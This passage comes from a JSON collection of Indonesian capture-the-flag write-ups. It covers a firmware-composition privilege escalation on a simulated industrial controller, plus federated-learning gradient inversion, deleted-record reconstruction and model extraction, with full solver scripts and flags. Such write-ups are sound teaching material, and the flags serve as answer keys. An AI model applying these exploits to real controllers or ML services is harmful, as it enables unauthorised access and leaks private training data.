        "code": "c89fb079007fb87950c2c00d4cd0d1e74ea742482c30fe3373609ccdaac358c3\nfc8e9bbf9e0b8eb00a6c264d087ccaa4984db3a428e4e0e96bf55be97b421ae9\n5670e63da940793de2527b8d68b59b8eae039134a0614638513b59bfbc2ca992\ne32523b9c5cc8e7f4b943023b4d4d7122ac8f773ad99b5e9d78b0f0c5515e31c\n1cad93e8479a7eb5b9f7ef04ffcb481e2262fe131e81f7b631cc058a60bd557d\n29d63bd8f16fb2eb1667067fa3a318d377e2f07b3c61160a5bb11eeb74ed53ec"
      },
      {
        "title": "Dekripsi",
        "content": "Script staging menjelaskan formatnya: setiap record berukuran 32768 byte, terdiri dari nonce 12 byte dan ciphertext AES-GCM dengan AAD `payload.bin|7|<index>`. Setelah record valid dipisahkan, dekripsi dilakukan dengan keyslot job 7.\n\n\n\nDi plaintext record job 7 ditemukan:\n\n\n\nHasil partial decrypt menampilkan shard pertama sebagai `isfar{p4r1ty_n3`. Karakter `a` adalah byte yang ikut rusak pada write-hole; dengan protokol flag `isfcr{...}`, shard yang valid adalah `isfcr{p4r1ty_n3`. Data job 6 yang masih tertinggal di bay 2 berisi `isfcr{st4l3_d4t` dan merupakan stale-data decoy.",
        "code": "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\nkey = bytes.fromhex(\"f1d921fa87176e694601c89950e4bae1f38bae1e19b0e5ae5c4aa00b31fcfa3d\")\nrecord = open(\"record5.bin\", \"rb\").read()\nplain = AESGCM(key).decrypt(record[:12], record[12:], b\"payload.bin|7|5\")\nopen(\"plain5.bin\", \"wb\").write(plain)"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{p4r1ty_n3v3r_l13s_wr1t3_h0l3_r3m3mb3rs}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-iot-fluxgateg3",
    "title": "Fluxgate G3 — Signed Parts, Unsigned Whole",
    "category": "IoT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "**Category:** IoT / Firmware Exploitation  \n**Challenge:** Fluxgate G3  \n**Target:** `0.cloud.chals.io:25537`  \n**Status:** SOLVED",
    "problemDescription": "Fluxgate G3 merupakan industrial controller yang menyediakan maintenance service melalui TCP. Service ini mendukung firmware update, boot, operator token, dan pengiriman maintenance frame.\n\nTarget kita adalah mendapatkan akses ke factory service mode menggunakan operator token berprivilege rendah.\n\nFirmware controller dibagi menjadi tiga komponen:\n\n- **POL (Policy):** Mendefinisikan opcode dan action yang dijalankan.\n- **TAB (Translation Table):** Mendefinisikan capability yang diperlukan untuk menjalankan opcode.\n- **RAD (Radio):** Menentukan versi framing dan konfigurasi komunikasi.\n\nKetiga komponen diverifikasi secara terpisah menggunakan signature Ed25519.\n\nKerentanannya terletak pada mekanisme *firmware composition*. Dua firmware yang sama-sama ditandatangani vendor dapat dipasang bersamaan sehingga menghasilkan kombinasi otorisasi yang tidak aman.",
    "tools": [],
    "analysis": "Kita memperoleh firmware bundle yang berisi beberapa versi POL, TAB, dan RAD, serta dokumentasi protokol.\n\nSaat melakukan koneksi, controller menyediakan perintah `STATUS`, `UPDATE`, `BOOT`, `TOKEN`, dan `SEND`.\n\nKonfigurasi awal perangkat:\n\n| Component | Version | Counter | Build |\n|---|---|---|---|\n| POL | v3 | 3 | 0x0303 |\n| TAB | v2 | 2 | 0x1002 |\n| RAD | v2 | 2 | 0x2002 |\n\nPOL bawaan memiliki dependency:\n\n`tab:v2-v2, rad:v2-v2`\n\nArtinya, POL hanya kompatibel dengan TAB versi 2. Update langsung menuju TAB versi 3 akan menyebabkan dependency mismatch.\n\nDokumentasi artifact menjelaskan format `FXG1`, yang berisi component, version, security counter, build ID, dependency, payload, dan signature Ed25519 sepanjang 64 byte.\n\nAturan update mengharuskan:\n\n1. Signature vendor valid.\n2. Security counter baru lebih besar atau sama dengan counter terpasang.\n3. Semua dependency antarkomponen terpenuhi.\n\nBagian menariknya adalah kondisi kedua: **security counter yang sama masih diperbolehkan**.\n\nDi dalam bundle, terdapat firmware `pol-v3rc.fw` dengan version 3, counter 3, dan build `0x03c1`.\n\nBerbeda dari `pol-v3.fw`, firmware ini menerima TAB versi 1 sampai 3, serta menambahkan handler:\n\n`opcode 0x70 → action 0x07 (UNLOCK)`\n\nSementara itu, `tab-v3.fw` memiliki mapping:\n\n`opcode 0x70 → required_mask 0x0001`\n\nPadahal pada `tab-v2.fw`, opcode yang sama membutuhkan capability `0x8000`.\n\n| Firmware | Opcode 0x70 | Capability |\n|---|---|---|\n| POL v3 | Tidak ada handler | — |\n| POL v3rc | UNLOCK | Ditentukan TAB |\n| TAB v2 | Didaftarkan | SERVICE (0x8000) |\n| TAB v3 | Didaftarkan | BASIC_READ (0x0001) |\n\nDari sini terlihat bahwa TAB versi 3 menurunkan persyaratan akses untuk factory unlock.",
    "solution": [
      {
        "title": "Root Cause",
        "content": "Kerentanan terjadi karena dua mekanisme:\n\n**Security counter sidegrade**\n\nFirmware `pol-v3rc` dapat menggantikan `pol-v3` meskipun security counter keduanya sama-sama 3. Signature masih valid dan dependency firmware baru menerima TAB v2 yang sudah terpasang.\n\n**Authorization downgrade**\n\nSetelah POL v3rc terpasang, TAB v3 dapat diinstal. Loader menggunakan tabel capability dari TAB untuk memutuskan apakah sebuah opcode boleh dijalankan, kemudian menggunakan tabel handler dari POL untuk menjalankan aksinya.\n\nDengan kombinasi ini, action `UNLOCK` yang seharusnya membutuhkan capability `SERVICE` justru dapat dijalankan menggunakan `BASIC_READ`.\n\nTidak diperlukan signature forgery, private key vendor, atau pemalsuan operator token."
      },
      {
        "title": "Stage 1 — Policy sidegrade",
        "content": "Kita memasang `pol-v3rc.fw` melalui perintah `UPDATE`, menggunakan artifact signed dari bundle.\n\nServer menerima update:\n\n`OK installed pol@v3 (counter=3, build=0x03c1)`\n\nSekarang dependency POL sudah mengizinkan TAB sampai versi 3."
      },
      {
        "title": "Stage 2 — Translation table upgrade",
        "content": "Berikutnya kita memasang `tab-v3.fw`.\n\nServer memberikan respons:\n\n`OK installed tab@v3 (counter=3, build=0x1003)`\n\nSetelah dua update, kondisi firmware menjadi:\n\n| Component | Version | Build |\n|---|---|---|\n| POL | v3 | 0x03c1 |\n| TAB | v3 | 0x1003 |\n| RAD | v2 | 0x2002 |"
      },
      {
        "title": "Stage 3 — Boot",
        "content": "Kita menjalankan `BOOT`.\n\nServer merespons:\n\n`OK boot ok: pol@v3.03c1 tab@v3.1003 rad@v2.2002`\n\nSemua signature dan dependency dinyatakan valid. Device sekarang menjalankan kombinasi firmware dengan permission mapping yang telah berubah."
      },
      {
        "title": "Stage 4 — Operator token",
        "content": "Perintah `TOKEN` memberikan token Base64 berukuran 24 byte setelah decoding.\n\nToken tersebut berisi:\n\n| Field | Value |\n|---|---|\n| User ID | 42 |\n| Capabilities | 0x0003 |\n| Nonce | 0xc0de1337 |\n| Authentication | HMAC-SHA256 truncated |\n\nCapability `0x0003` mencakup BASIC_READ dan STATUS, tetapi tidak mencakup SERVICE (`0x8000`).\n\nMeskipun demikian, permission mapping baru hanya meminta BASIC_READ untuk menjalankan UNLOCK."
      },
      {
        "title": "Stage 5 — Craft maintenance frame",
        "content": "Format frame menurut dokumentasi adalah:\n\n`magic(2) | version(1) | opcode(1) | length(1) | payload | token(24)`\n\nKita menggunakan magic `FG`, radio version `0x02`, opcode `0x70`, dan payload kosong. Token yang sah ditempelkan di bagian akhir.\n\nFrame yang terbentuk:\n\n`4647027000002a0003c0de13376f49fffe4e730d73f9b217c848bf9725`\n\nSetelah di-encode Base64, frame dikirim menggunakan `SEND`.\n\nServer memberikan respons:\n\n`OK resp_b64=dW5sb2NrOmlzZmNye3MxZ24zZF9wNHJ0c191bnMxZ24zZF93aG9sZV9hYjg0ZjF9`\n\nHasil decoding:\n\n`unlock:isfcr{s1gn3d_p4rts_uns1gn3d_whole_ab84f1}`\n\nFactory unlock berhasil dijalankan menggunakan token operator berprivilege rendah."
      },
      {
        "title": "Flag",
        "content": "**isfcr{s1gn3d_p4rts_uns1gn3d_whole_ab84f1}**\n\nFlag diperoleh langsung dari respons remote controller, bukan dari patching firmware atau flag yang ditebak."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Fluxgate G3: signed firmware sidegrade + translation-table privilege downgrade.\n\nStandalone solver; the two firmware blobs below are byte-for-byte copies of\nartifacts/pol-v3rc.fw and artifacts/tab-v3.fw from the provided fluxgate.zip.\nNo third-party dependencies.\n\nUsage: python3 solve.py [HOST] [PORT]\n\"\"\"\nimport base64\nimport re\nimport socket\nimport sys\n\nHOST = sys.argv[1] if len(sys.argv) > 1 else \"0.cloud.chals.io\"\nPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 25537\n\nPOL_V3RC = (\n    \"RlhHMXBvbAADAwPBAnRhYgABA3JhZAABAgA3BxACB0ZYRyBHMyAgAQAwAwdkaWFnPW9r\"\n    \"QAQTYmF1ZD05NjAwLGFkZHI9MHgxMVAFAGAGAHAHACAMb5THV6lGx6R9CcIQluDHApxh\"\n    \"Cak4ADXyAyIqdT1L9y+rLrS1TKT++2f6QB+cjNXK3UuJ5/FHiG9dReUNKAo=\"\n)\nTAB_V3 = (\n    \"RlhHMXRhYgADAxADAXBvbAADAwAWBxAAAiAAATAABEAACFABAGACAHAAAQVFLY9vqTsw\"\n    \"RPrBKphIFM/QIWNzRb9y8sOcO0eGRDgj/qVf1ZlD5UWnYa71E444LRV1S/XSi7/XMoT5tKO4FgU=\"\n)\n\n\ndef read_reply(sock, quiet=0.45):\n    \"\"\"Read all currently pending lines; protocol has no end-of-reply marker.\"\"\"\n    sock.settimeout(quiet)\n    chunks = []\n    while True:\n        try:\n            data = sock.recv(65536)\n        except socket.timeout:\n            break\n        if not data:\n            break\n        chunks.append(data)\n    result = b\"\".join(chunks).decode(\"utf-8\", \"replace\")\n    if result.strip():\n        print(result.rstrip(), flush=True)\n    return result\n\n\ndef command(sock, line):\n    if isinstance(line, bytes):\n        line = line.decode(\"ascii\")\n    print(\"[>] \" + (line[:48] + \"...\" if len(line) > 48 else line), flush=True)\n    sock.sendall(line.encode(\"ascii\") + b\"\\n\")\n    resp = read_reply(sock)\n    if not resp:\n        raise RuntimeError(\"Connection closed or no response\")\n    if re.search(r\"(?m)^ERR(?: |$)\", resp):\n        raise RuntimeError(\"Device rejected command: \" + resp.strip())\n    return resp\n\n\ndef firmware_info(blob_b64):\n    \"\"\"Check embedded firmware layout without altering its vendor signature.\"\"\"\n    fw = base64.b64decode(blob_b64, validate=True)\n    if len(fw) < 79 or fw[:4] != b\"FXG1\":\n        raise ValueError(\"Invalid embedded firmware\")\n    offset = 13 + fw[12] * 6\n    n = int.from_bytes(fw[offset:offset + 2], \"big\")\n    if offset + 2 + n + 64 != len(fw):\n        raise ValueError(\"Malformed signed firmware\")\n    return fw[4:8].rstrip(b\"\\x00\").decode(), fw[8], fw[9], fw[offset + 2:offset + 2 + n]\n\n\ndef main():\n    pol_name, pol_version, pol_counter, pol = firmware_info(POL_V3RC)\n    tab_name, tab_version, tab_counter, tab = firmware_info(TAB_V3)\n    assert (pol_name, pol_version, pol_counter) == (\"pol\", 3, 3)\n    assert (tab_name, tab_version, tab_counter) == (\"tab\", 3, 3)\n    assert b\"\\x70\\x07\\x00\" in pol, \"POL must map opcode 0x70 to UNLOCK\"\n    assert b\"\\x70\\x00\\x01\" in tab, \"TAB must map opcode 0x70 to BASIC_READ\"\n\n    with socket.create_connection((HOST, PORT), timeout=12) as sock:\n        print(\"[*] Controller greeting:\")\n        read_reply(sock)\n        status = command(sock, \"STATUS\")\n        # Default radio is v2; detect if device announces another installed version.\n        rad_match = re.search(r\"\\brad:\\s*v(\\d+)\", status)\n        frame_version = int(rad_match.group(1)) if rad_match else 2\n        if not 0 <= frame_version <= 255:\n            raise ValueError(\"Unexpected radio version\")\n\n        # CRUCIAL ORDER: pol-v3 normally pins tab-v2; first install pol-v3rc\n        # (counter 3 sidegrade) to widen tab dependency to [1..3].\n        command(sock, \"UPDATE \" + POL_V3RC)\n        # tab-v3 is vendor-signed and maps opcode 0x70 to cap 0x0001.\n        command(sock, \"UPDATE \" + TAB_V3)\n        command(sock, \"STATUS\")\n        boot = command(sock, \"BOOT\")\n        if \"boot ok\" not in boot.lower():\n            raise RuntimeError(\"Boot did not succeed\")\n\n        issued = command(sock, \"TOKEN\")\n        match = re.search(r\"\\btoken_b64=([A-Za-z0-9+/=]+)\", issued)\n        if not match:\n            raise RuntimeError(\"TOKEN response did not include token_b64\")\n        token = base64.b64decode(match.group(1), validate=True)\n        if len(token) != 24:\n            raise ValueError(f\"Expected 24-byte token, got {len(token)} bytes\")\n        user_id = int.from_bytes(token[:2], \"big\")\n        capabilities = int.from_bytes(token[2:4], \"big\")\n        print(f\"[+] user_id={user_id} capabilities=0x{capabilities:04x}\")\n        if not (capabilities & 1):\n            raise RuntimeError(\"Operator token lacks BASIC_READ capability\")\n\n        # FG | frame version | opcode UNLOCK | 0-byte payload | signed token\n        frame = b\"FG\" + bytes((frame_version, 0x70, 0)) + token\n        result = command(sock, \"SEND \" + base64.b64encode(frame).decode())\n\n        candidates = [result]\n        for b64 in re.findall(r\"\\b(?:resp|key|blob|data)_b64=([A-Za-z0-9+/=]+)\", result):\n            try:\n                binary = base64.b64decode(b64, validate=True)\n                print(\"[+] Decoded response (repr):\", repr(binary))\n                candidates.append(binary.decode(\"utf-8\", \"replace\"))\n            except (ValueError, base64.binascii.Error):\n                continue\n        for text in candidates:\n            found = re.search(r\"isfcr\\{[^\\}\\r\\n]+\\}\", text)\n            if found:\n                print(\"\\n<FLAG>\" + found.group() + \"</FLAG>\")\n                return\n        print(\"[!] UNLOCK was sent; inspect the decoded service response above.\")\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{s1gn3d_p4rts_uns1gn3d_whole_ab84f1}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-ml-theaggregateremembers",
    "title": "The Aggregate Remembers",
    "category": "ML",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The Aggregate Remembers",
    "problemDescription": "Update model federated dapat dipisahkan karena setiap delta memakai kombinasi linear dari tiga client. Setelah gradient client target dipulihkan pada beberapa checkpoint, dua record target dicari dari bentuk gradient regresi linear.",
    "tools": [],
    "analysis": "Update model federated dapat dipisahkan karena setiap delta memakai kombinasi linear dari tiga client. Setelah gradient client target dipulihkan pada beberapa checkpoint, dua record target dicari dari bentuk gradient regresi linear.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `data.json`: checkpoint weights dan delta update.\n- `unlock.py`: verifier AES-GCM untuk jawaban record."
      },
      {
        "title": "Temuan Penting",
        "content": "Learning rate adalah `1/8` dan weight decay `1/64`, sehingga:\n\n\n\nUntuk setiap checkpoint, baris `mix` membentuk sistem linear tiga client. Proyeksi ke nullspace client 0 dan 2 menyisakan gradient target client 1.",
        "code": "gradient = -8 * delta - weights / 64"
      },
      {
        "title": "Proses Ekstraksi",
        "content": "Untuk dua feature vector `x1` dan `x2`, label keduanya 1, gradient target adalah:\n\n\n\n`solve.py` mem-fit dua vector tersebut pada enam checkpoint, membalik permutation/center/scale, membulatkan kembali ke byte, lalu mengurutkan hex secara ASCII. Hasilnya:",
        "code": "0.5 * ((w·x1 - 1)x1 + (w·x2 - 1)x2)"
      },
      {
        "title": "Catatan",
        "content": "Flag juga tervalidasi langsung dengan:",
        "code": "python3 unlock.py '[\"07841f68cb73fe5aac5cbf66f113f992\",\"ff1247cd40f11a77f9495f7ba9648a20\"]'"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\nimport hashlib\nimport json\nfrom pathlib import Path\n\nimport numpy as np\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nfrom scipy.optimize import least_squares\n\nBASE = Path(__file__).resolve().parent\n\n\ndef main():\n    data = json.loads((BASE / \"data.json\").read_text())\n    model = data[\"model\"]\n    weights = {c[\"id\"]: np.array(c[\"weights\"], float) for c in model[\"checkpoints\"]}\n\n    # For each checkpoint, eliminate clients 0 and 2 from the mixed gradients.\n    # The remaining projected vector is the target client's gradient.\n    target_gradients = []\n    for checkpoint_id, w in weights.items():\n        updates = [u for u in data[\"updates\"]\n                   if u[\"cohort\"] == \"acquisition-A\" and u[\"checkpoint\"] == checkpoint_id]\n        mix = np.array([np.array(u[\"mix\"], float) / sum(u[\"mix\"]) for u in updates])\n        observed = np.array([-8 * np.array(u[\"delta\"], float) - w / 64 for u in updates])\n        projection = np.eye(len(updates)) - mix[:, [0, 2]] @ np.linalg.pinv(mix[:, [0, 2]])\n        target_column = projection @ mix[:, 1]\n        q = target_column / (target_column @ mix[:, 1])\n        target_gradients.append((w, q @ observed))\n\n    # For two records x1,x2 and label 1:\n    # grad(w) = 1/2*((w.x1-1)x1 + (w.x2-1)x2).\n    def residual(z):\n        x1, x2 = z[:17], z[17:]\n        out = []\n        for w, g in target_gradients:\n            predicted = 0.5 * ((w @ x1 - 1) * x1 + (w @ x2 - 1) * x2)\n            out.extend(predicted - g)\n        return np.array(out)\n\n    result = least_squares(residual, np.zeros(34), max_nfev=20000)\n    if np.linalg.norm(result.fun) > 0.2:\n        raise RuntimeError(\"gradient fit failed\")\n\n    records = []\n    for x in (result.x[:17], result.x[17:]):\n        raw = [0] * 16\n        for j, raw_index in enumerate(model[\"permutation\"]):\n            raw[raw_index] = round(x[j] * model[\"scale\"][j] + model[\"center\"][j])\n        records.append(bytes(raw).hex())\n    records.sort()\n\n    encoded = json.dumps(records, separators=(\",\", \":\")).encode(\"ascii\")\n    key = hashlib.sha256(b\"isfcr-ml\\0\" + encoded).digest()\n    sealed = {\n        \"nonce\": \"e998058b414d847495581d10\",\n        \"ciphertext\": \"a60e4bf8768408472276e6a39ce958137f41d1a1a9c5be234429a493dce84be925496b86e1a558ea021d84a993bff1\",\n    }\n    flag = AESGCM(key).decrypt(bytes.fromhex(sealed[\"nonce\"]),\n                               bytes.fromhex(sealed[\"ciphertext\"]),\n                               b\"the-aggregate-remembers\").decode()\n    print(json.dumps(records))\n    print(flag)\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{9b1aa6a53205a859c14cc5e4}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-ml-thedeletionecho",
    "title": "The Deletion Echo",
    "category": "ML",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The Deletion Echo",
    "problemDescription": "Snapshot menyimpan model ridge regression, sedangkan query memberi mean dan predictive variance. Predictive variance cukup untuk merekonstruksi matriks Gram tiap snapshot. Selisih dua snapshot mengungkap batch ingest dan subset record yang dihapus. Persamaan mean kemudian memberi label integer.",
    "tools": [],
    "analysis": "Fitur adalah transformasi linear tanpa intercept dari vektor `raw`. Mean query mengikuti `qᵀθ`, sedangkan predictive variance mengikuti `noise × (1 + qᵀH⁻¹q)`. Karena komponen kuadrat diketahui dan query tersebar pada 12 dimensi, koefisien kuadrat dapat difit dari query.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `data.json`: kontrak fitur, kandidat, batch ingest, snapshot, dan 1.200 query.\n- `unlock.py`: memeriksa JSON jawaban dengan scrypt dan AES-GCM, lalu membuka flag."
      },
      {
        "title": "Temuan Penting",
        "content": "- `snapshot-d1f54facd170` dan `snapshot-80794d4ee21c` merepresentasikan desain yang sama; keduanya dipakai untuk meredam noise pembulatan.\n- Transisi `snapshot-d1f54facd170` → `snapshot-e385b6f3720a` cocok dengan ingest batch `ingest-e0449f2a` dikurangi 26 record kandidat.\n- Galat relatif antara selisih Gram terukur dan batch dikurangi subset kandidat sekitar `1.39e-5`.\n- Nilai mean membentuk 12 persamaan integer. Setelah semua fitur dikalikan empat, closest-vector pada lattice menghasilkan residu nol pada seluruh persamaan dan label dalam rentang 0–3."
      },
      {
        "title": "Proses Ekstraksi",
        "content": "`solve.py` memfit matriks Gram dan vektor parameter dari query, lalu menggunakan MILP untuk memilih subset kandidat yang menjelaskan perubahan matriks Gram. Sesudah itu, fpylll mereduksi lattice dan mencari vektor integer terdekat yang memenuhi persamaan mean. Script menyortir string `record-id:label` secara ASCII dan menyerahkannya langsung ke `unlock.py`.\n\nJalankan ulang dengan environment challenge:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solve Script",
        "content": "Implementasi lengkap ada di `solve.py`. Script memeriksa ulang kecocokan matriks Gram dan residu seluruh persamaan label sebelum memanggil verifier."
      },
      {
        "title": "Catatan",
        "content": "Tidak ada service remote yang digunakan. Seluruh analisis memakai artefak lokal challenge."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\nimport json, subprocess, sys\nimport numpy as np\nfrom scipy.optimize import milp, LinearConstraint, Bounds\n\nDATA='data.json'\nwith open(DATA) as f: data=json.load(f)\nc=data['contract']; p=np.array(c['permutation']); ce=np.array(c['center']); sc=np.array(c['scale'])\ndef feat(r): return (np.array(r['raw'])[p]-ce)/sc\ndef theta(sid):\n    q=[a for a in data['queries'] if a['snapshot_id']==sid]\n    Z=np.array([feat(a) for a in q]); y=np.array([float(a['mean']) for a in q])\n    return np.linalg.lstsq(Z,y,rcond=None)[0]\ndef gram(sid):\n    q=[a for a in data['queries'] if a['snapshot_id']==sid]\n    Z=np.array([feat(a) for a in q]); y=np.array([float(a['predictive_variance']) for a in q])\n    fs=[np.ones(len(Z))]; pairs=[]\n    for i in range(12):\n        for j in range(i,12): pairs.append((i,j)); fs.append(Z[:,i]*Z[:,j]*(1 if i==j else 2))\n    co=np.linalg.lstsq(np.array(fs).T,y,rcond=None)[0]; K=np.zeros((12,12))\n    for v,(i,j) in zip(co[1:],pairs): K[i,j]=K[j,i]=v\n    return np.linalg.inv(K/co[0])\n\nold='snapshot-d1f54facd170'; new='snapshot-e385b6f3720a'\n# d1 and 807 are duplicate-design redeploys; average their covariance fits.\nHold=(gram(old)+gram('snapshot-80794d4ee21c'))/2\nHnew=gram(new)\nG=Hnew-Hold\nD=Hnew@theta(new)-Hold@theta(old)\nbatch=data['ingest'][1]['records']\nix=np.triu_indices(12)\nC=np.array([np.outer(feat(r),feat(r))[ix] for r in data['candidates']]).T\nS_full=sum(np.outer(feat(r),feat(r)) for r in batch); target=S_full[ix]-G[ix]\nscale=np.linalg.norm(C,axis=1); A=C/scale[:,None]\ntarget=target/scale\nM=np.vstack([np.hstack([A,-np.eye(78)]),np.hstack([-A,-np.eye(78)])])\nrhs=np.r_[target,-target]\nout=milp(np.r_[np.ones(140)*1e-4,np.ones(78)],integrality=np.r_[np.ones(140),np.zeros(78)],\n         bounds=Bounds(np.zeros(218),np.r_[np.ones(140),np.full(78,np.inf)]),\n         constraints=LinearConstraint(M,-np.inf,rhs),options={'time_limit':30})\nif not out.success: raise SystemExit('subset MILP failed')\ndeleted=[r for r,v in zip(data['candidates'],out.x[:140]) if v>.5]\nS_deleted=sum(np.outer(feat(r),feat(r)) for r in deleted)\nif np.linalg.norm(S_full-G-S_deleted)/np.linalg.norm(S_deleted)>5e-5:\n    raise SystemExit('recovered subset does not match the Gram-matrix transition')\nprint('deleted records:',len(deleted))\n\n# Integer labels satisfy: sum(batch feature*label) - sum(deleted feature*label) = D.\n# Multiply feature coordinates by four so every coefficient is integral, then\n# solve the bounded integer system as a closest-vector problem.\nB=np.array([[int(round(4*feat(r)[j])) for r in batch] for j in range(12)])\nQ=np.array([[int(round(4*feat(r)[j])) for r in deleted] for j in range(12)])\nA=np.hstack([B,-Q]); nv=len(batch)+len(deleted)\nfrom fpylll import IntegerMatrix, LLL, CVP\ncoord_scale=1000; label_scale=10\nbasis=IntegerMatrix(nv,12+nv)\nfor i in range(nv):\n    for j in range(12): basis[i,j]=int(A[j,i])*coord_scale\n    basis[i,12+i]=label_scale\nLLL.reduction(basis)\ntarget=tuple([int(round(4*D[j]))*coord_scale for j in range(12)]+[int(1.5*label_scale)]*nv)\nclosest=CVP.closest_vector(basis,target,method='proved')\nvalues=[int(round(closest[12+i]/label_scale)) for i in range(nv)]\nif any(v<0 or v>3 for v in values) or not np.array_equal(A@values,np.rint(4*D).astype(int)):\n    raise SystemExit('integer label recovery failed exact validation')\nlabels={r['id']:v for r,v in zip(deleted,values[len(batch):])}\nanswer=sorted(f\"{r['id']}:{labels[r['id']]}\" for r in deleted)\narg=json.dumps(answer,separators=(',',':'))\nprint(arg)\nsubprocess.run([sys.executable,'unlock.py',arg],check=False)"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{763c8479fac095a9e471ad3d}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-ml-theshapeofsilence",
    "title": "The Shape of Silence",
    "category": "ML",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The Shape of Silence",
    "problemDescription": "Model mengembalikan fungsi piecewise-affine pada enam input rasional. Kumpulan `captures` berisi cloud kecil yang berada di satu region lokal. Tiap cloud punya tujuh pasangan input-output, cukup untuk memulihkan satu bidang affine secara eksak. Pasangan cloud dalam capture yang sama menyingkap perubahan antar-aktivasi.",
    "tools": [],
    "analysis": "Capture dari versi `v-41e59d` adalah data model lama dan harus dilewati. Versi aktif adalah `v-8fb4ff`. Untuk setiap cloud aktif, tujuh titik `x` dan `y` menentukan unik fungsi affine `w·x + b`.\n\nHasil fitting menghasilkan 32 bidang affine berbeda. Selisih bidang dari pasangan cloud hanya menghasilkan sembilan delta affine berbeda, dengan tanda yang bisa dibalik. Semua bidang aktif dapat ditulis sebagai satu bidang dasar ditambah kombinasi biner dari sembilan delta tersebut.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `data.json`: versi model aktif, capture, 16 anchor, dan 24 target.\n- `unlock.py`: memeriksa jawaban lewat hash dan AES-GCM, lalu membuka flag."
      },
      {
        "title": "Temuan Penting",
        "content": "Untuk tiap delta, nilai affine delta pada titik cloud memisahkan semua observasi menjadi dua keadaan. Dengan demikian, sembilan delta itu juga memberikan sembilan pemisah linear aktivasi. Tanda orientasi dan pola patch dapat dicari secara eksak dari capture.\n\nValidasi penting:\n\n- Semua titik individual pada cloud cocok dengan aktivasi dan bidang yang dipulihkan.\n- Semua 16 anchor menghasilkan nilai yang sama persis dengan `data.json`.\n- `unlock.py` menerima daftar hasil untuk 24 target dan membuka flag."
      },
      {
        "title": "Proses Ekstraksi",
        "content": "1. Fit bidang affine setiap cloud menggunakan eliminasi Gauss dengan `fractions.Fraction`.\n2. Ambil sembilan delta unik dari selisih bidang pada masing-masing pasangan cloud.\n3. Cari orientasi delta yang menghasilkan semua 32 bidang sebagai kombinasi biner dari bidang dasar.\n4. Tentukan orientasi aktivasi dari tanda nilai affine delta pada pusat cloud, lalu validasi terhadap setiap titik cloud.\n5. Evaluasi target menggunakan bidang yang ditentukan sembilan aktivasi. Semua perhitungan tetap rasional dan eksak.\n6. Cocokkan seluruh anchor, lalu berikan hasil ke `unlock.py`."
      },
      {
        "title": "Catatan",
        "content": "Flag berasal dari hasil dekripsi `unlock.py` setelah jawaban lolos verifikasi AES-GCM, bukan dari tebakan atau pencarian eksternal."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Recover the piecewise-affine model from data.json and unlock the flag.\"\"\"\n\nfrom __future__ import annotations\n\nimport itertools\nimport json\nfrom fractions import Fraction\nfrom pathlib import Path\n\nfrom unlock import unlock\n\n\nBASE_DIR = Path(__file__).resolve().parent\n\n\ndef q(value: str | int) -> Fraction:\n    return Fraction(value)\n\n\ndef affine_fit(cloud: list[dict], dimension: int) -> tuple[Fraction, ...]:\n    \"\"\"Find coefficients (w0, ..., w[d-1], bias) from d+1 exact samples.\"\"\"\n    width = dimension + 1\n    if len(cloud) != width:\n        raise ValueError(f\"Expected {width} samples in cloud, found {len(cloud)}\")\n\n    matrix = [\n        [q(v) for v in point[\"x\"]] + [Fraction(1), q(point[\"y\"])]\n        for point in cloud\n    ]\n    for col in range(width):\n        pivot = next((r for r in range(col, width) if matrix[r][col]), None)\n        if pivot is None:\n            raise ValueError(\"Cloud samples do not determine a unique affine patch\")\n        matrix[col], matrix[pivot] = matrix[pivot], matrix[col]\n        scale = matrix[col][col]\n        matrix[col] = [v / scale for v in matrix[col]]\n        for row in range(width):\n            if row != col and matrix[row][col]:\n                scale = matrix[row][col]\n                matrix[row] = [a - scale * b for a, b in zip(matrix[row], matrix[col])]\n\n    return tuple(matrix[i][-1] for i in range(width))\n\n\ndef dot(coefficients: tuple[Fraction, ...], x: list[str | int]) -> Fraction:\n    return sum((a * q(b) for a, b in zip(coefficients, x)), Fraction(0))\n\n\ndef extract_model(data: dict):\n    version = data[\"model_version\"]\n    dimension = data[\"dimension\"]\n    observations = []\n    planes = set()\n    deltas = []\n\n    for capture in data[\"captures\"]:\n        if capture[\"model_version\"] != version:\n            continue\n        if len(capture[\"clouds\"]) != 2:\n            raise ValueError(\"Expected paired clouds in each current-version capture\")\n\n        pair = []\n        for cloud in capture[\"clouds\"]:\n            plane = affine_fit(cloud, dimension)\n            planes.add(plane)\n            center = tuple(\n                sum((q(point[\"x\"][i]) for point in cloud), Fraction(0)) / 